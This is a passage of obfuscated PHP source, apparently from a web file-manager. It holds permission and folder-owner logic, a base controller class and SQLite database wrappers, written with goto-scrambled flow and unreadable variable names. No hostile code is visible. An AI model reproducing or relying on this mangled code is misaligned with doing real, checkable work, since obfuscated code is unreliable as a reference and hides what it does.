break; } } if (!$Fß“òáÒ && $bŞó™Ò›¯Ü[$cã¬‚¬Ö¸°[367]] == SourceModel::TYPE_GROUP) { $aĞğ¬‚„Ï¸ = $bŞó™Ò›¯Ü[$cã¬‚¬Ö¸°[452]]; if (isset($c—÷õéä‡†[$aĞğ¬‚„Ï¸])) { $F­Ùê‰ùÊ÷ = $c—÷õéä‡†[$aĞğ¬‚„Ï¸]; $Aí“ÔšÑ–É = Model($cã¬‚¬Ö¸°[454])->getInfo($aĞğ¬‚„Ï¸); $Fß“òáÒ = array($cã¬‚¬Ö¸°[2238] => intval($F­Ùê‰ùÊ÷[$cã¬‚¬Ö¸°[372]][$cã¬‚¬Ö¸°[372]]), $cã¬‚¬Ö¸°[2239] => $F­Ùê‰ùÊ÷[$cã¬‚¬Ö¸°[372]], $cã¬‚¬Ö¸°[2233] => array($cã¬‚¬Ö¸°[384] => $cã¬‚¬Ö¸°[2240], $cã¬‚¬Ö¸°[75] => $Aí“ÔšÑ–É[$cã¬‚¬Ö¸°[387]][$cã¬‚¬Ö¸°[365]], $cã¬‚¬Ö¸°[2241] => $Aí“ÔšÑ–É[$cã¬‚¬Ö¸°[459]])); } } goto Cë–ŸÉ©ùö; EÊî£¢Æš: } public function authOwnerApply($còŸÂ‚ëÍê) { goto d”´°çƒ£; c×Øä¸¤Š±: $BÙÒ›œïç¨ = Model($Cèš«‚õº°[1104])->parentLevelArray($còŸÂ‚ëÍê[$Cèš«‚õº°[455]]); $BÙÒ›œïç¨ = array_merge(array($còŸÂ‚ëÍê[$Cèš«‚õº°[365]]), array_reverse($BÙÒ›œïç¨)); $a¼Ù£ßùïÀ = $Cèš«‚õº°[2230]; goto b¤æ£ÎÌ¦; b¤æ£ÎÌ¦: $aöÑÃä‡Š = array($Cèš«‚õº°[379] => array($Cèš«‚õº°[380], $BÙÒ›œïç¨)); $Bç¬·ï¢“„ = $this->field($a¼Ù£ßùïÀ)->where($aöÑÃä‡Š)->select(); $Bç¬·ï¢“„ = array_to_keyvalue_group($Bç¬·ï¢“„, $Cèš«‚õº°[365]); goto A—½¼æ‡; d”´°çƒ£: $Cèš«‚õº° =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($còŸÂ‚ëÍê[$Cèš«‚õº°[372]]) || isset($còŸÂ‚ëÍê[$Cèš«‚õº°[2244]]) && $còŸÂ‚ëÍê[$Cèš«‚õº°[2244]]) { return $còŸÂ‚ëÍê; } if (AuthModel::authCheckRoot($còŸÂ‚ëÍê[$Cèš«‚õº°[372]][$Cèš«‚õº°[373]])) { return $còŸÂ‚ëÍê; } goto c×Øä¸¤Š±; Cì ï¾£ª×: $còŸÂ‚ëÍê[$Cèš«‚õº°[372]][$Cèš«‚õº°[2246]] = Model($Cèš«‚õº°[470])->userListInfo($FÂğ»ÈÄ“ß); return $còŸÂ‚ëÍê; goto E’ÎÂÄëè; f‹Ò·Ç¥Ö: if (count($FÂğ»ÈÄ“ß) == 0) { $FÂğ»ÈÄ“ß = $this->authFolderOwnerGroup($còŸÂ‚ëÍê[$Cèš«‚õº°[452]]); } $FÂğ»ÈÄ“ß = array_unique($FÂğ»ÈÄ“ß); if (AuthModel::authCheckRoot($còŸÂ‚ëÍê[$Cèš«‚õº°[372]][$Cèš«‚õº°[373]])) { $FÂğ»ÈÄ“ß[] = USER_ID; } goto Cì ï¾£ª×; A—½¼æ‡: $F•öÓœ…¥ = array(); $FÂğ»ÈÄ“ß = array(); foreach ($Bç¬·ï¢“„ as $eÎœÕ½ùáß => $fˆßåô°Ó) { $Bë¿‘©“·ğ = $this->authFolderOwnerUser($fˆßåô°Ó); $F•öÓœ…¥[$eÎœÕ½ùáß] = $Bë¿‘©“·ğ; $FÂğ»ÈÄ“ß = array_merge($FÂğ»ÈÄ“ß, $Bë¿‘©“·ğ[$Cèš«‚õº°[531]]); if ($Bë¿‘©“·ğ[$Cèš«‚õº°[2245]]) { break; } } goto f‹Ò·Ç¥Ö; E’ÎÂÄëè: } private function authFolderOwnerGroup($F÷Ã°¹©‚‚) { $e³–¼áƒˆî =& $_SERVER[Ö¹ñÒÁ²÷]; $Eó¤±àéçÃ = Model($e³–¼áƒˆî[2154])->where(array($e³–¼áƒˆî[2079] => $F÷Ã°¹©‚‚))->select(); $B²å˜°¨£‚ = array(); if (!$Eó¤±àéçÃ) { return $B²å˜°¨£‚; } foreach ($Eó¤±àéçÃ as $aæ¤µÎïÆ¯) { $e·‚ºŸ®œÃ = $this->authInfo($aæ¤µÎïÆ¯); if (AuthModel::authCheckRoot($e·‚ºŸ®œÃ[$e³–¼áƒˆî[372]])) { $B²å˜°¨£‚[] = $aæ¤µÎïÆ¯[$e³–¼áƒˆî[1415]]; } } return $B²å˜°¨£‚; } private function authFolderOwnerUser($C¤«Š…øÀ™) { $dšä•Ö„ÃÈ =& $_SERVER[Ö¹ñÒÁ²÷]; $aÛ÷Ü«„ÑŠ = array(); $C«Ÿğ× = !1; foreach ($C¤«Š…øÀ™ as $CÀ’î·‰áØ) { $Cò‹œÀˆñ = $this->authInfo($CÀ’î·‰áØ); if ($CÀ’î·‰áØ[$dšä•Ö„ÃÈ[452]] == $dšä•Ö„ÃÈ[464]) { $C«Ÿğ× = !0; } if ($CÀ’î·‰áØ[$dšä•Ö„ÃÈ[367]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Cò‹œÀˆñ[$dšä•Ö„ÃÈ[372]])) { $aÛ÷Ü«„ÑŠ[] = $CÀ’î·‰áØ[$dšä•Ö„ÃÈ[452]]; } } } return array($dšä•Ö„ÃÈ[531] => $aÛ÷Ü«„ÑŠ, $dšä•Ö„ÃÈ[2245] => $C«Ÿğ×); } public function authMake($CÜĞãÖã¾Š) { goto aÏ„©…äõº; aé»½ÉªÚ’: $FñÜ§íõ•¢ = 0; $Fë¿œ†‡º = array($BîìÖ™×Œ•[365] => 0); foreach ($CÜĞãÖã¾Š as $Fë¿œ†‡º) { $EŒÄù°­×ƒ = $this->authInfo($Fë¿œ†‡º); $f¶ïÔä‹©› = $Fë¿œ†‡º[$BîìÖ™×Œ•[452]]; $b­›ç·“¼™ = intval($EŒÄù°­×ƒ[$BîìÖ™×Œ•[372]]); if ($Fë¿œ†‡º[$BîìÖ™×Œ•[367]] == SourceModel::TYPE_USER && $f¶ïÔä‹©› == USER_ID) { $e§âÆÆÎ–ˆ = !0; $a„‚îÆ¸àò = $EŒÄù°­×ƒ; $C¨¸ãŠŒ = $b­›ç·“¼™; } else { if ($Fë¿œ†‡º[$BîìÖ™×Œ•[367]] == SourceModel::TYPE_GROUP && in_array($f¶ïÔä‹©›, $DæÏ÷á‘–)) { $Eöåƒ§ÅÕ = !0; if ($b­›ç·“¼™ >= $eò¸½¯ÒßÀ) { $eò¸½¯ÒßÀ = $b­›ç·“¼™; $f¥Ç§Ô¾«º = $EŒÄù°­×ƒ; } } else { if ($f¶ïÔä‹©› == $BîìÖ™×Œ•[464]) { $FñÜ§íõ•¢ = !0; $A’ê¡æÙ = $EŒÄù°­×ƒ; $c‘Ä­àÀÔ… = $b­›ç·“¼™; } } } } goto dŞ§£ğĞÓ; dŞ§£ğĞÓ: $a½½”‹ËÀ¾ = $e§âÆÆÎ–ˆ ? $C¨¸ãŠŒ : ($Eöåƒ§ÅÕ ? $eò¸½¯ÒßÀ : $c‘Ä­àÀÔ…); $EŒÄù°­×ƒ = $e§âÆÆÎ–ˆ ? $a„‚îÆ¸àò : ($Eöåƒ§ÅÕ ? $f¥Ç§Ô¾«º : $A’ê¡æÙ); $D‰ãñÑ¹šà = $e§âÆÆÎ–ˆ ? $BîìÖ™×Œ•[2247] : ($Eöåƒ§ÅÕ ? $BîìÖ™×Œ•[2248] : ($FñÜ§íõ•¢ ? $BîìÖ™×Œ•[2249] : $BîìÖ™×Œ•[357])); goto EÇŸ‡ê£Œ¥; E‡¦õ‰¯„·: $A’ê¡æÙ = 0; $e§âÆÆÎ–ˆ = 0; $Eöåƒ§ÅÕ = 0; goto aé»½ÉªÚ’; aÏ„©…äõº: $BîìÖ™×Œ• =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$CÜĞãÖã¾Š) { return array($BîìÖ™×Œ•[373] => 0, $BîìÖ™×Œ•[414] => !1); } $dÒ’‡®´Ö = Session::get($BîìÖ™×Œ•[2192]); goto E¾‹“†Ìé“; D‘Çùçî¼: $c‘Ä­àÀÔ… = 0; $a„‚îÆ¸àò = 0; $f¥Ç§Ô¾«º = 0; goto E‡¦õ‰¯„·; E¾‹“†Ìé“: $DæÏ÷á‘– = array_to_keyvalue($dÒ’‡®´Ö, $BîìÖ™×Œ•[33], $BîìÖ™×Œ•[2079]); $C¨¸ãŠŒ = 0; $eò¸½¯ÒßÀ = 0; goto D‘Çùçî¼; EÇŸ‡ê£Œ¥: $e‡‚ï¾´Â = array($BîìÖ™×Œ•[2238] => intval($a½½”‹ËÀ¾), $BîìÖ™×Œ•[2239] => $EŒÄù°­×ƒ, $BîìÖ™×Œ•[2233] => array($BîìÖ™×Œ•[384] => $D‰ãñÑ¹šà, $BîìÖ™×Œ•[75] => $Fë¿œ†‡º[$BîìÖ™×Œ•[365]])); return $e‡‚ï¾´Â; goto Bî¡ƒÜïÕï; Bî¡ƒÜïÕï: } public function authTargetInfoMake($B Ò©×ŸŒ¡) { goto AÏğ•ÁÇ×‡; FÛÇï«³®Ó: return array($fæ›’õšö[2250] => $FÚ×¦††Òæ, $fæ›’õšö[2241] => $A‡µ›ìíˆ±); goto eÃ¡‰ªå¥; AÏğ•ÁÇ×‡: $fæ›’õšö =& $_SERVER[Ö¹ñÒÁ²÷]; $FÚ×¦††Òæ = array(); $A‡µ›ìíˆ± = array(); goto fÉÛñÊ´æ™; fÉÛñÊ´æ™: foreach ($B Ò©×ŸŒ¡ as $EõÇ½÷ŸøÒ) { if ($EõÇ½÷ŸøÒ[$fæ›’õšö[367]] == SourceModel::TYPE_USER) { $FÚ×¦††Òæ[] = intval($EõÇ½÷ŸøÒ[$fæ›’õšö[452]]); } else { if ($EõÇ½÷ŸøÒ[$fæ›’õšö[367]] == SourceModel::TYPE_GROUP) { $A‡µ›ìíˆ±[] = intval($EõÇ½÷ŸøÒ[$fæ›’õšö[452]]); } } } if ($FÚ×¦††Òæ) { $FÚ×¦††Òæ = Model($fæ›’õšö[470])->userListInfo($FÚ×¦††Òæ); } if ($A‡µ›ìíˆ±) { $D¹ÓÖÁ®èª = array($fæ›’õšö[2152] => array($fæ›’õšö[380], $A‡µ›ìíˆ±)); $A‡µ›ìíˆ± = Model($fæ›’õšö[454])->field($fæ›’õšö[2165])->where($D¹ÓÖÁ®èª)->select(); $A‡µ›ìíˆ± = array_to_keyvalue($A‡µ›ìíˆ±, $fæ›’õšö[2079]); } goto FÛÇï«³®Ó; eÃ¡‰ªå¥: } private function authInfo($f„ÌÍá®¬Ö) { $BáÛŞñĞ– =& $_SERVER[Ö¹ñÒÁ²÷]; if ($f„ÌÍá®¬Ö[$BáÛŞñĞ–[2208]]) { $fÄ§‘´˜é… = Model($BáÛŞñĞ–[2227])->listData($f„ÌÍá®¬Ö[$BáÛŞñĞ–[2208]]); if (!$fÄ§‘´˜é…) { return !1; $aêñø­¿›° = Model($BáÛŞñĞ–[2227])->listData(); $eøƒ«Âì² = array_filter_by_field($aêñø­¿›°, $BáÛŞñĞ–[372], $BáÛŞñĞ–[464]); return $eøƒ«Âì²; } $a¹Û‰ùèî¢ = array_field_key($fÄ§‘´˜é…, array($BáÛŞñĞ–[363], $BáÛŞñĞ–[28], $BáÛŞñĞ–[372], $BáÛŞñĞ–[2097], $BáÛŞñĞ–[2100])); $a¹Û‰ùèî¢[$BáÛŞñĞ–[2251]] = $f„ÌÍá®¬Ö; return $a¹Û‰ùèî¢; } else { return array($BáÛŞñĞ–[381] => 0, $BáÛŞñĞ–[2085] => $f„ÌÍá®¬Ö[$BáÛŞñĞ–[2209]], $BáÛŞñĞ–[382] => $BáÛŞñĞ–[33], $BáÛŞñĞ–[2097] => $BáÛŞñĞ–[2252]); } } } goto eÆ†±ÉïÓ”; C±÷İĞÎçŒ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto Eƒ²×òö’; Eƒ²×òö’: $E³°‚ŠÛ =& $_SERVER[Ö¹ñÒÁ²÷]; global $in, $config; $this->config =& $config; goto D‘šÇ¥„²Ó; D‘šÇ¥„²Ó: $this->in =& $in; $this->values[$E³°‚ŠÛ[6]] =& $config; $this->values[$E³°‚ŠÛ[7]] =& $in; goto Fë­šÊÇáã; Fë­šÊÇáã: $this->tpl = TEMPLATE . MOD . $E³°‚ŠÛ[8]; $this->_classObjectID = mt_rand(0, 10000); goto F„±±Ñµ»ƒ; F„±±Ñµ»ƒ: } public function loadClass($bŠá„Ş ÛŞ) { if (1 === func_num_args()) { $this->{$bŠá„Ş ÛŞ} = new $bŠá„Ş ÛŞ(); } else { $d§‡±‚ÎĞÛ = new ReflectionClass($bŠá„Ş ÛŞ); $aŒĞ´†–µÎ = func_get_args(); array_shift($aŒĞ´†–µÎ); $this->{$bŠá„Ş ÛŞ} = $d§‡±‚ÎĞÛ->newInstanceArgs($aŒĞ´†–µÎ); } return $this->{$bŠá„Ş ÛŞ}; } protected function assign($EÊ·±îÂÂ„, $c±ªŒƒ´›í) { $this->values[$EÊ·±îÂÂ„] = $c±ªŒƒ´›í; } protected function display($Fëáôö–Æ) { ob_end_clean(); extract($this->values); require $this->tpl . $Fëáôö–Æ; } } class DbSqliteBase extends Db { public function __construct($aŞÙÍ¯¢Ò¨ = '') { $b¼ã¬Øƒ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!extension_loaded($b¼ã¬Øƒ[9])) { think_exception(think_lang($b¼ã¬Øƒ[10]) . $b¼ã¬Øƒ[11]); } if (!empty($aŞÙÍ¯¢Ò¨)) { if (!isset($aŞÙÍ¯¢Ò¨[$b¼ã¬Øƒ[12]])) { $aŞÙÍ¯¢Ò¨[$b¼ã¬Øƒ[12]] = 438; } $this->config = $aŞÙÍ¯¢Ò¨; if (empty($this->config[$b¼ã¬Øƒ[13]])) { $this->config[$b¼ã¬Øƒ[13]] = array(); } } } public function connect($Aè„‚·ƒø» = '', $DˆšÁ¹‹»Å = 0) { $EãÉÒ¢±  =& $_SERVER[Ö¹ñÒÁ²÷]; if (!isset($this->linkID[$DˆšÁ¹‹»Å])) { goto E™ô¢¢Õ®É; E™ô¢¢Õ®É: if (empty($Aè„‚·ƒø»)) { $Aè„‚·ƒø» = $this->config; } $C³®ë¾ùÀ = !empty($Aè„‚·ƒø»[$EãÉÒ¢± [13]][$EãÉÒ¢± [14]]) ? $Aè„‚·ƒø»[$EãÉÒ¢± [13]][$EãÉÒ¢± [14]] : $this->pconnect; $AôÄø‹¯¦¨ = $C³®ë¾ùÀ ? $EãÉÒ¢± [15] : $EãÉÒ¢± [16]; goto EÀˆŒµ£·³; Bà”ªæ³…é: @sqlite_busy_timeout($this->linkID[$DˆšÁ¹‹»Å], 30000); if (1 != think_config($EãÉÒ¢± [18])) { unset($this->config); } goto B‡‡ÜîƒíÄ; EÀˆŒµ£·³: $this->linkID[$DˆšÁ¹‹»Å] = $AôÄø‹¯¦¨($Aè„‚·ƒø»[$EãÉÒ¢± [17]], $Aè„‚·ƒø»[$EãÉÒ¢± [12]]); if (!$this->linkID[$DˆšÁ¹‹»Å]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto Bà”ªæ³…é; B‡‡ÜîƒíÄ: } return $this->linkID[$DˆšÁ¹‹»Å]; } public function free() { $this->queryID = null; } public function query($a¬³å¡Ï¯) { goto DµçÕ®ñªÂ; eõ…ß´‰–: $this->queryStr = $a¬³å¡Ï¯; if ($this->queryID) { $this->free(); } think_action_status($f„ÉâË–Šê[19], 1); goto DğÁ“éä”š; bÆ´Ææ¤ï…: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $FËÇ‘õÒ½Ú = $this->getAll(); return $FËÇ‘õÒ½Ú; } goto CË›Š†‡Ö; DµçÕ®ñªÂ: $f„ÉâË–Šê =& $_SERVER[Ö¹ñÒÁ²÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eõ…ß´‰–; DğÁ“éä”š: think_status($f„ÉâË–Šê[20]); $this->queryID = sqlite_query($this->_linkID, $a¬³å¡Ï¯); $this->debug(); goto bÆ´Ææ¤ï…; CË›Š†‡Ö: } public function execute($b¾à—¡óª) { goto aøîÛŸïÊó; Aà­×»âÚ‹: if (!1 === $dö÷Ù‰î°Å) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto aá¾ã§í»·; aøîÛŸïÊó: $Aš¸ëç¿¡ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D‰šñ…ö; dÖªÍï“¶‘: think_status($Aš¸ëç¿¡[20]); $dö÷Ù‰î°Å = sqlite_exec($this->_linkID, $b¾à—¡óª); $this->debug(); goto Aà­×»âÚ‹; D‰šñ…ö: $this->queryStr = $b¾à—¡óª; if ($this->queryID) { $this->free(); } think_action_status($Aš¸ëç¿¡[21], 1); goto dÖªÍï“¶‘; aá¾ã§í»·: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ö¹ñÒÁ²÷][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d¡Â¼£ô‡ = sqlite_query($this->_linkID, $_SERVER[Ö¹ñÒÁ²÷][23]); if (!$d¡Â¼£ô‡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $dˆ¾Ó×©Ğ¬ = sqlite_query($this->_linkID, $_SERVER[Ö¹ñÒÁ²÷][24]); if (!$dˆ¾Ó×©Ğ¬) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $D¦£…îƒø = array(); if ($this->numRows > 0) { for ($A‡¬ÔŠ¦“· = 0; $A‡¬ÔŠ¦“· < $this->numRows; $A‡¬ÔŠ¦“·++) { $D¦£…îƒø[$A‡¬ÔŠ¦“·] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $D¦£…îƒø; } public function getFields($f”ò†çÒí„) { $AÆ¿‘”ã‚¤ =& $_SERVER[Ö¹ñÒÁ²÷]; $e’‹§Î‹Û© = $this->query($AÆ¿‘”ã‚¤[25] . $f”ò†çÒí„ . $AÆ¿‘”ã‚¤[26]); $f‚…–¤³‘ì = array(); if ($e’‹§Î‹Û©) { foreach ($e’‹§Î‹Û© as $CŒöø‘±óà => $a˜¸÷¤Ô³§) { $f‚…–¤³‘ì[$a˜¸÷¤Ô³§[$AÆ¿‘”ã‚¤[27]]] = array($AÆ¿‘”ã‚¤[28] => $a˜¸÷¤Ô³§[$AÆ¿‘”ã‚¤[27]], $AÆ¿‘”ã‚¤[29] => $a˜¸÷¤Ô³§[$AÆ¿‘”ã‚¤[30]], $AÆ¿‘”ã‚¤[31] => (bool) ($a˜¸÷¤Ô³§[$AÆ¿‘”ã‚¤[32]] === $AÆ¿‘”ã‚¤[33]), $AÆ¿‘”ã‚¤[34] => $a˜¸÷¤Ô³§[$AÆ¿‘”ã‚¤[35]], $AÆ¿‘”ã‚¤[36] => strtolower($a˜¸÷¤Ô³§[$AÆ¿‘”ã‚¤[37]]) == $AÆ¿‘”ã‚¤[38], $AÆ¿‘”ã‚¤[39] => strtolower($a˜¸÷¤Ô³§[$AÆ¿‘”ã‚¤[40]]) == $AÆ¿‘”ã‚¤[41]); } } return $f‚…–¤³‘ì; } public function getTables($bÌ×‰Õø¬ = '') { $D•£‰ƒîÙÑ =& $_SERVER[Ö¹ñÒÁ²÷]; $AŠÓáïÂ©å = $this->query($D•£‰ƒîÙÑ[42] . $D•£‰ƒîÙÑ[43] . $D•£‰ƒîÙÑ[44]); $fÙ÷Ú¢ù÷¯ = array(); foreach ($AŠÓáïÂ©å as $b¦ã˜¦£Àê => $fÚö·Ü Ôî) { $fÙ÷Ú¢ù÷¯[$b¦ã˜¦£Àê] = current($fÚö·Ü Ôî); } return $fÙ÷Ú¢ù÷¯; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Aíˆ…ÓÆ¹‘ =& $_SERVER[Ö¹ñÒÁ²÷]; $aØš°Œ‘à = sqlite_last_error($this->_linkID); $this->error = $aØš°Œ‘à . $Aíˆ…ÓÆ¹‘[4] . sqlite_error_string($aØš°Œ‘à); if ($Aíˆ…ÓÆ¹‘[33] != $this->queryStr) { $this->error .= LNG($Aíˆ…ÓÆ¹‘[45]) . $this->queryStr; } think_trace($this->error, $Aíˆ…ÓÆ¹‘[33], $Aíˆ…ÓÆ¹‘[46]); return $this->error; } public function escapeString($f¢Ä†ù…ÌÕ) { return sqlite_escape_string($f¢Ä†ù…ÌÕ); } public function parseLimit($EÆ¦‰²¤†„) { $DŞ õŠôƒ± =& $_SERVER[Ö¹ñÒÁ²÷]; $céÖ‹Ç‡ß‚ = $DŞ õŠôƒ±[33]; if (!empty($EÆ¦‰²¤†„)) { $EÆ¦‰²¤†„ = explode($DŞ õŠôƒ±[47], $EÆ¦‰²¤†„); if (count($EÆ¦‰²¤†„) > 1) { $céÖ‹Ç‡ß‚ .= $DŞ õŠôƒ±[48] . $EÆ¦‰²¤†„[1] . $DŞ õŠôƒ±[49] . $EÆ¦‰²¤†„[0] . $DŞ õŠôƒ±[50]; } else { $céÖ‹Ç‡ß‚ .= $DŞ õŠôƒ±[48] . $EÆ¦‰²¤†„[0] . $DŞ õŠôƒ±[50]; } } return $céÖ‹Ç‡ß‚; } } class DbSqlite3Base extends Db { public function __construct($e·±÷îš™± = '') { $Bö†×Ö–‹© =& $_SERVER[Ö¹ñÒÁ²÷]; if (!class_exists($Bö†×Ö–‹©[51])) { think_exception(think_lang($Bö†×Ö–‹©[10]) . $Bö†×Ö–‹©[52]); } if (!empty($e·±÷îš™±)) { if (!isset($e·±÷îš™±[$Bö†×Ö–‹©[12]])) { $e·±÷îš™±[$Bö†×Ö–‹©[12]] = 438; } $this->config = $e·±÷îš™±; if (empty($this->config[$Bö†×Ö–‹©[13]])) { $this->config[$Bö†×Ö–‹©[13]] = array(); } } } public function connect($F£åÖëŸÖ = '', $cÇåÍŠìì– = 0) { $Fè¹ŞÈÒÃ” =& $_SERVER[Ö¹ñÒÁ²÷]; if (!isset($this->linkID[$cÇåÍŠìì–])) { if (empty($F£åÖëŸÖ)) { $F£åÖëŸÖ = $this->config; } $this->linkID[$cÇåÍŠìì–] = new SQLite3($F£åÖëŸÖ[$Fè¹ŞÈÒÃ”[17]]); if (!$this->linkID[$cÇåÍŠìì–]) { think_exception($this->linkID[$cÇåÍŠìì–]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$cÇåÍŠìì–]->busyTimeout(30000); if (1 != think_config($Fè¹ŞÈÒÃ”[18])) { unset($this->config); } } return $this->linkID[$cÇåÍŠìì–]; } public function free() { $this->queryID = null; } public function query($Cñã–ÉÔˆ—) { goto Cà‘­³Š¥ê; bç†¸ë›é: think_status($A¦œ„ÓÑ[20]); $this->queryID = $this->_linkID->query($Cñã–ÉÔˆ—); $this->debug(); goto A“•éÙõëø; Cà‘­³Š¥ê: $A¦œ„ÓÑ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dõµ„ö¼¨; A“•éÙõëø: if (!1 === $this->queryID) { $this->error(); return !1; } else { $aòâ¿Éœ§– = $this->getAll(); $this->numRows = count($aòâ¿Éœ§–); return $aòâ¿Éœ§–; } goto F°Ó¬ó¢‘°; dõµ„ö¼¨: $this->queryStr = $Cñã–ÉÔˆ—; if ($this->queryID) { $this->free(); } think_action_status($A¦œ„ÓÑ[19], 1); goto bç†¸ë›é; F°Ó¬ó¢‘°: } public function execute($B‰ğÌ§õØ‰) { goto aéÔÆ ªÜŸ; cì×µ¸–ù: $this->queryStr = $B‰ğÌ§õØ‰; if ($this->queryID) { $this->free(); } think_action_status($EŠÒË¬Î¡Ù[21], 1); goto Cà¨³ºß; Aç‹—ĞŞ²½: if (!1 === $D®¾„îÜ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto Bİ¹âˆŒÅß; aéÔÆ ªÜŸ: $EŠÒË¬Î¡Ù =& $_SERVER[Ö¹ñÒÁ²÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cì×µ¸–ù; Cà¨³ºß: think_status($EŠÒË¬Î¡Ù[20]); $D®¾„îÜ = $this->_linkID->exec($B‰ğÌ§õØ‰); $this->debug(); goto Aç‹—ĞŞ²½; Bİ¹âˆŒÅß: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ö¹ñÒÁ²÷][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EÃøéš†³ = $this->_linkID->query($_SERVER[Ö¹ñÒÁ²÷][23]); if (!$EÃøéš†³) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $AóÓÀ’îµÌ = $this->_linkID->query($_SERVER[Ö¹ñÒÁ²÷][24]); if (!$AóÓÀ’îµÌ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Eâğ°•ÔøÔ = array(); while ($BĞßÚ‰¢Óª = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Eâğ°•ÔøÔ[] = $BĞßÚ‰¢Óª; } $this->queryID->reset(); return $Eâğ°•ÔøÔ; } public function getFields($DŠ«Å•˜ ÷) { $d¯Şå‰ò¥Ù =& $_SERVER[Ö¹ñÒÁ²÷]; $E‹Ì£§¨éÜ = $this->query($d¯Şå‰ò¥Ù[25] . $DŠ«Å•˜ ÷ . $d¯Şå‰ò¥Ù[26]); $eÚ•÷èÂÓ¾ = array(); if ($E‹Ì£§¨éÜ) { foreach ($E‹Ì£§¨éÜ as $dÊÃòö‡¾± => $A¼ÂõÓÊ) { $eÚ•÷èÂÓ¾[$A¼ÂõÓÊ[$d¯Şå‰ò¥Ù[28]]] = array($d¯Şå‰ò¥Ù[28] => $A¼ÂõÓÊ[$d¯Şå‰ò¥Ù[28]], $d¯Şå‰ò¥Ù[29] => $A¼ÂõÓÊ[$d¯Şå‰ò¥Ù[29]], $d¯Şå‰ò¥Ù[31] => (bool) ($A¼ÂõÓÊ[$d¯Şå‰ò¥Ù[31]] === $d¯Şå‰ò¥Ù[33]), $d¯Şå‰ò¥Ù[34] => $A¼ÂõÓÊ[$d¯Şå‰ò¥Ù[53]], $d¯Şå‰ò¥Ù[36] => (bool) $A¼ÂõÓÊ[$d¯Şå‰ò¥Ù[54]], $d¯Şå‰ò¥Ù[39] => (bool) $A¼ÂõÓÊ[$d¯Şå‰ò¥Ù[54]]); } } return $eÚ•÷èÂÓ¾; } public function getTables($BòÉœ‹¦§¦ = '') { $EÂ·¢À•ä =& $_SERVER[Ö¹ñÒÁ²÷]; $dº÷òÂÒæ” = $this->query($EÂ·¢À•ä[42] . $EÂ·¢À•ä[43] . $EÂ·¢À•ä[44]); $fŞ˜©ó¨Ğ = array(); foreach ($dº÷òÂÒæ” as $dùáÑ³Åë² => $D—‘Åï‘Œ) { $fŞ˜©ó¨Ğ[$dùáÑ³Åë²] = current($D—‘Åï‘Œ); } return $fŞ˜©ó¨Ğ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $cÆŞÙ¨‚£„ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->error = $this->_linkID->lastErrorMsg(); if ($cÆŞÙ¨‚£„[33] != $this->queryStr) { $this->error .= LNG($cÆŞÙ¨‚£„[45]) . $this->queryStr; } think_trace($this->error, $cÆŞÙ¨‚£„[33], $cÆŞÙ¨‚£„[46]); return $this->error; } public function escapeString($bÏÑˆï²¦») { $a‘¬Õ²Ã =& $_SERVER[Ö¹ñÒÁ²÷]; if ($this->_linkID) { return $this->_linkID->escapeString($bÏÑˆï²¦»); } return str_ireplace($a‘¬Õ²Ã[55], $a‘¬Õ²Ã[56], $bÏÑˆï²¦»); } public function parseLimit($BìºŞŞ¡øŠ) { $DœŠœã¿Ğò =& $_SERVER[Ö¹ñÒÁ²÷]; $CØ…Œ„¥Â = $DœŠœã¿Ğò[33]; if (!empty($BìºŞŞ¡øŠ)) { $BìºŞŞ¡øŠ = explode($DœŠœã¿Ğò[47], $BìºŞŞ¡øŠ); if (count($BìºŞŞ¡øŠ) > 1) { $CØ…Œ„¥Â .= $DœŠœã¿Ğò[48] . $BìºŞŞ¡øŠ[1] . $DœŠœã¿Ğò[49] . $BìºŞŞ¡øŠ[0] . $DœŠœã¿Ğò[50]; } else { $CØ…Œ„¥Â .= $DœŠœã¿Ğò[48] . $BìºŞŞ¡øŠ[0] . $DœŠœã¿Ğò[50]; } } return $CØ…Œ„¥Â; } } goto c§µ˜İÇÛù; Bˆ‚íìÉ®Š: class GetInfo { private static $fileTypeArray; public static function get($Eì¬†Î®±) { $Dò”äòô•· = IO::info($Eì¬†Î®±); return self::infoAdd($Dò”äòô•·); } public static function infoAdd(&$cÖÍæ’ƒê) { goto DµÚÈ£±µ“; D·©»Ú˜¦·: if (!$cÖÍæ’ƒê || $cÖÍæ’ƒê[$eßó˜É·ˆ[29]] != $eßó˜É·ˆ[163]) { return; } if 